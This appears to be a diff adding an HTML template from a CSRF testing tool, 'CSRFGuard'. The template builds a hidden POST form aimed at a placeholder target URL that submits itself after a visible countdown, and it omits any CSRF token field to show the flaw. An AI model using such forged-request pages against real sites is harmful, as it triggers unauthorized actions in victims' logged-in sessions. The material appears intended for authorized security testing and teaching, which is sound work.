@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<!--
+╔══════════════════════════════════════════════════════════════════╗
+║               CSRFGuard — CSRF Proof of Concept                 ║
+║         FOR AUTHORIZED ACADEMIC TESTING ONLY                    ║
+║  Do not deploy outside a controlled lab environment.            ║
+╚══════════════════════════════════════════════════════════════════╝
+  Template  : Standard POST  (application/x-www-form-urlencoded)
+  Target    : {{ TARGET_URL }}
+  Generated : {{ TIMESTAMP }}
+
+  Attack Mechanics
+  ────────────────
+  When a victim with an active session visits this page, their browser
+  silently submits the hidden form. The browser attaches session cookies
+  automatically, so the server cannot distinguish the forged request
+  from a legitimate one — unless a CSRF token or SameSite=Strict is set.
+-->
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRFGuard PoC — {{ TARGET_URL }}</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #0d1117;
+      color: #c9d1d9;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+    }
+
+    .card {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 10px;
+      padding: 2rem 2.5rem;
+      max-width: 620px;
+      width: 100%;
+    }
+
+    .badge {
+      display: inline-block;
+      background: #b91c1c;
+      color: #fff;
+      font-size: 0.68rem;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      padding: 3px 10px;
+      border-radius: 4px;
+      margin-bottom: 1.2rem;
+    }
+
+    h1   { font-size: 1.1rem; color: #f0f6fc; margin-bottom: .3rem; }
+    .sub { font-size: .8rem;  color: #8b949e; margin-bottom: 1.5rem; }
+    code { font-family: monospace; color: #79c0ff; }
+
+    table { width: 100%; border-collapse: collapse; font-size: .82rem; margin-bottom: 1.5rem; }
+    th    { text-align: left; color: #8b949e; font-weight: 600; padding: 4px 8px;
+            border-bottom: 1px solid #30363d; }
+    td    { padding: 5px 8px; color: #c9d1d9; word-break: break-all; }
+    td:first-child { color: #79c0ff; font-family: monospace; }
+
+    .status { font-size: .8rem; color: #8b949e; }
+    #timer  { color: #f0883e; font-weight: 600; }
+
+    footer {
+      margin-top: 1.5rem;
+      padding-top: 1rem;
+      border-top: 1px solid #21262d;
+      font-size: .7rem;
+      color: #484f58;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+
+    <span class="badge">⚠ For Authorized Academic Testing Only</span>
+
+    <h1>CSRFGuard — Standard POST PoC</h1>
+    <p class="sub">Auto-submitting to: <code>{{ TARGET_URL }}</code></p>
+
+    <table>
+      <tr><th>Field</th><th>Value</th></tr>
+      <tr><td>Target URL</td><td>{{ TARGET_URL }}</td></tr>
+      <tr><td>Method</td><td>POST</td></tr>
+      <tr><td>Encoding</td><td>application/x-www-form-urlencoded</td></tr>
+      <tr><td>Generated</td><td>{{ TIMESTAMP }}</td></tr>
+    </table>
+
+    <p class="status">Submitting in <span id="timer">3</span>s…</p>
+
+    <!--
+      The hidden form below is submitted automatically.
+      All fields from the original form are reproduced as hidden inputs.
+      If a CSRF token field was detected, it is omitted (with a comment)
+      to demonstrate the missing-token vulnerability.
+    -->
+    <form id="csrf-poc"
+          action="{{ TARGET_URL }}"
+          method="POST"
+          enctype="application/x-www-form-urlencoded"
+          style="display:none;">
+      {{ FORM_FIELDS }}
+    </form>
+
+    <footer>
+      CSRFGuard v1.0 &nbsp;|&nbsp; Authorized academic testing only
+      &nbsp;|&nbsp; {{ TIMESTAMP }}
+    </footer>
+
+  </div>
+
+  <script>
+    /* Countdown then auto-submit.  Delay gives a presenter time to
+       show the page before the request fires — useful in demos.     */
+    (function () {
+      var n   = 3;
+      var el  = document.getElementById('timer');
+      var t   = setInterval(function () {
+        n -= 1;
+        el.textContent = n;
+        if (n <= 0) {
+          clearInterval(t);
+          document.getElementById('csrf-poc').submit();
+        }
+      }, 1000);
+    }());
+  </script>
+</body>
+</html>
